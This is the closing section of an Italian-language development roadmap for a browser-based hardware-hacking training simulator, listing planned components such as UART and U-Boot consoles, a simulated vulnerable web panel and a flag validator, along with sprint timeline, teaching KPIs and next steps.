| `UARTTerminal` | Console UART con bootlog | 🔴 ALTA | 2 giorni |
| `UBootShell` | Bootloader interattivo | 🟡 MEDIA | 2 giorni |
| `LinuxShell` | Shell root completa | 🔴 ALTA | 3 giorni |
| `FlashDumpViewer` | Analisi partizioni flash | 🟡 MEDIA | 2 giorni |
| `WebAdminPanel` | Pannello web vulnerable | 🔴 ALTA | 2 giorni |
| `BackdoorAnalysis` | Step-by-step backdoor analysis | 🟢 BASSA | 3 giorni |
| `BrokenPinDialog` | Info su piste interrotte | 🟡 MEDIA | 0.5 giorni |
| `ExerciseStepper` | Progress tracker multi-step | 🔴 ALTA | 1 giorno |
| `HintSystem` | Sistema hint progressivi | 🟡 MEDIA | 1 giorno |
| `FlagValidator` | Validazione flag composte | 🔴 ALTA | 0.5 giorni |

**Totale**: ~18 giorni di sviluppo

---

## 📅 TIMELINE E PRIORITÀ

### Sprint 1 (Settimana 1-2): Core Foundation
- ✅ PCBViewer enhancement
- ✅ UARTTerminal basic
- ✅ LinuxShell base
- ✅ ExerciseStepper
- **Deliverable**: HW identification + UART access funzionanti

### Sprint 2 (Settimana 3-4): Advanced Features
- ✅ UBootShell completo
- ✅ LinuxShell completo con filesystem
- ✅ FlashDumpViewer
- ✅ HintSystem progressivo
- **Deliverable**: Bootloader e shell exploration completi

### Sprint 3 (Settimana 5): Exploitation
- ✅ WebAdminPanel
- ✅ CVE-2023-33538 simulation
- ✅ FlagValidator
- **Deliverable**: Vulnerability exploitation funzionante

### Sprint 4 (Settimana 6): Polish & Backdoor
- ✅ BackdoorAnalysis
- ✅ Tutorial mode
- ✅ UI/UX polish
- ✅ Testing e bug fixing
- **Deliverable**: Esperienza completa end-to-end

---

## 🎯 METRICHE DI SUCCESSO

### KPI Didattici
- **Completion Rate**: >75% utenti completano almeno 5/7 step
- **Avg Time**: 2.5-3.5 ore per esercizio completo
- **Hint Usage**: <2 hint per step in media
- **Understanding**: Quiz finale con score >80%

### KPI Tecnici
- **Performance**: FCP <1.5s, LCP <2.5s
- **Reliability**: <1% crash rate
- **Compatibility**: Funziona su Chrome, Firefox, Safari
- **Mobile**: Usabile su tablet (iPad+)

---

## 🔚 CONCLUSIONE

Questa roadmap fornisce un piano dettagliato per implementare un simulatore completo di hardware hacking basato su vulnerabilità reali. L'approccio step-by-step permette sviluppo incrementale con deliverable tangibili ogni 2 settimane.

**Prossimi passi immediati**:
1. Review della roadmap con stakeholders
2. Setup del repository e branch strategy
3. Kickoff Sprint 1 con PCBViewer enhancement
4. Design review UI/UX con mockup
5. Creazione backlog dettagliato su project management tool

---

**Documento creato il**: 25 Gennaio 2026
**Versione**: 1.0
**Autore**: Davide Leone
